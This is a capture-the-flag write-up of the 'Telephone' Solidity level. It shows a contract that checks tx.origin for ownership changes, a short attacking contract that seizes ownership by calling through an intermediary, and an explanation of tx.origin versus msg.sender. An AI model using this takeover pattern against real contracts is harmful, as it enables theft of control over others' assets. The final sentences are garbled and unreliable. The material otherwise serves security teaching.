## Telephone

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

```solidity
contract ClaimOwnership{
    function telephone() external {
        Telephone(0x8C980640880b858087ccBE7D16F2102317CD3aaB).changeOwner(0x98979Be841a5621339aAbE07CbdCcE8fd358591c);
    }
}
```

With msg.sender the owner can be a contract.

With tx.origin the owner can never be a contract.

In a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A.

msg.sender is preferred for the flexibility it provides. Furthermore, for Serenity, even though it's a while out, Vitalik recommends avoiding tx.origin: How do I make my DAPP "Serenity-Proof?"

Carefully consider if you really ever need to use tx.origin. Remember, you may not be the only user of your contract. Other people may want to use your contract and want to interact with it via a contract they've been written.

In this Telephone contract tx.origin was misused, meaning anyone can call the contract will a contract and msg.sender will ever be tx.origin.
NOTE: Ever tx.origin to be what you consider to state the state of your contract.